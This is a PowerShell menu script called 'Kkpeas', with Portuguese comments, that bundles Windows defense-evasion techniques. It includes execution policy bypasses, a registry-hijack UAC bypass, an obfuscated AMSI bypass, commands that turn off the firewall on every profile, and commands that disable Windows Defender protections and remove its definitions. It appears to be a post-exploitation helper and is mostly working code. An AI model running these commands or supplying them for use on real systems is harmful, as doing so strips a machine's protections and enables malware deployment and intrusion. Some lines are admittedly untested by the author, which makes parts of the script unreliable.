
function center_print {
   param (
       [string]$Text,
       [string]$PaddingCharacter = '*',
       [ConsoleColor]$ForegroundColor = 'Yellow'
   )

   $windowWidth = $host.UI.RawUI.WindowSize.Width
   $textLength = $Text.Length
   $totalPaddingCharacters = $windowWidth - $textLength
   $leftPaddingCharacters = $totalPaddingCharacters / 2
   $rightPaddingCharacters = $totalPaddingCharacters / 2

   # If the total padding characters are an odd number, add one more to the right
   if ($totalPaddingCharacters % 2 -ne 0) {
       $rightPaddingCharacters++
   }

   $leftPadding = $PaddingCharacter * $leftPaddingCharacters
   $rightPadding = $PaddingCharacter * $rightPaddingCharacters

   Write-Host "$leftPadding$Text$rightPadding" -ForegroundColor $ForegroundColor
}

function execution_policy_bypass {
   center_print  "execution_policy_bypass" "=" "Red"
   # powershell.exe -ExecutionPolicy Bypass -File kkpeas.ps1 # para o arquivo
   # Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process # para a sessao
   Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser # para o usuário
   # HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell # altere aqui... em algum local
   # Set-ExecutionPolicy -ExecutionPolicy UnRestricted -Scope LocalMachine # para todos na máquina
   # Unblock-File -path .\CreateTestFiles.ps1 # Caso a politica seja RemoteSigned
   Get-ExecutionPolicy -list
}

function disable_execution_policy {
   center_print  "disable_execution_policy" "=" "Red"
   ($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))
   Get-ExecutionPolicy -list
}

function uac_bypass {
   center_print  "uac" "=" "Red"
   New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
   New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
   # Check if uac is disabled
   Get-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA
}

function amsi_bypass {
   center_print  "amsi" "=" "Red"
    [ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
   # check if amsi bypass had been done wright
   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
}

function disable_firewall {
   center_print  "disable_firewall" "=" "Red"
   Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
   cmd /c netsh advfirewall set allprofiles state off
   # check firewall stat on all profiles
   Get-NetFirewallProfile | select Name, Enabled
}

function disable_windows_defender {
   center_print  "disable_windows_defender" "=" "Red"
   Set-MpPreference -DisableIOAVProtection $true
   Set-MpPreference -DisableRealtimeMonitoring $true
   cmd /c sc stop WinDefend
   & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
   New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
   # Inventei isso... nao sei para o que serve
   New-ItemProperty -Path    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -PropertyType DWord

   center_print "Verificacao do Language Mode"
   $ExecutionContext.SessionState.LanguageMode
   $ExecutionContext.SessionState.LanguageMode = "FullLanguage"

   # Disable everything in windows defender
   Get-MpPreference | Set-MpPreference -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -DisableScanOnRealtimeEnable $true
   
   # check windows defender status  
   Get-MpPreference | select DisableIOAVProtection, DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableBlockAtFirstSeen, DisablePrivacyMode, SignatureDisableUpdateOnStartupWithoutEngine, DisableArchiveScanning, DisableIntrusionPreventionSystem, DisableScriptScanning, DisableScanOnRealtimeEnable
}

function Show-Menu {
    param (
        [string] $Title = 'My Menu'
    )
    Clear-Host
    center_print  "$Title" "#" "Red"
    Write-Host "1: Press '1' to execution_policy_bypass."
    Write-Host "2: Press '2' to disable_execution_policy."
    Write-Host "3: Press '3' to uac_bypass."
    Write-Host "4: Press '4' to amsi_bypass."
    Write-Host "5: Press '5' to disable_firewall."
    Write-Host "6: Press '6' to disable_windows_defender."
    Write-Host "q: Press 'q' to quit."
}

 $input = ''
 while ($input -ne 'q')
 {
     Show-Menu 'Kkpeas'
     $input = Read-Host "Please make a selection"
     switch ($input) {
         '1' {
            execution_policy_bypass
         }
         '2' {
            disable_execution_policy
         }
         '3' {
            uac_bypass
         }
         '4' {
            amsi_bypass
         }
         '5' {
            disable_firewall
         }
         '6' {
            disable_windows_defender
         }
         'q' {
            return
         }
     }
     Read-Host "Press Enter to continue..."
}